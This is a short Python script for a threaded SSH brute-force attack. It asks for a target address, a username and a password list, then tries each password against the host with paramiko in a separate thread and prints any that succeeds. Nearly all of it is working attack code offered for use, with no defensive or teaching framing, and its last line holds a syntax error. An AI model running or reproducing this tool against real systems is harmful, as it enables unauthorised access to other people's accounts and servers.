import os
import socket
import sys
import threading
import time

import paramiko
import termcolor

stop_flag = 0

def hunter_ssh():
    """
    Performs SSH brute-force attack using a list of passwords.

    Returns:
        None
    """
    def ssh_connect(password, code=0):
        """
        Tries to establish an SSH connection using the given password.

        Args:
            password (str): Password to try.
            code (int): Exit code.

        Returns:
            None
        """
        global stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, port=22, username=username, password=password)
            stop_flag = 1
            print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green', attrs=['bold']))
        except:
            print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red', attrs=['bold']))
        ssh.close()

    host = input('[+] Target Address: ')
    username = input('[+] SSH Username: ')
    input_file = input('[+] Path to Passwords File: ')
    print('\n')

    if not os.path.exists(input_file):
        print(termcolor.colored('[!!] That File/Path Doesnt Exist', 'red', attrs=['bold']))
        sys.exit(1)

    print('====== Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' ======')

    with open(input_file, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(password,))
            t.start()
            time.sleep(0.5))
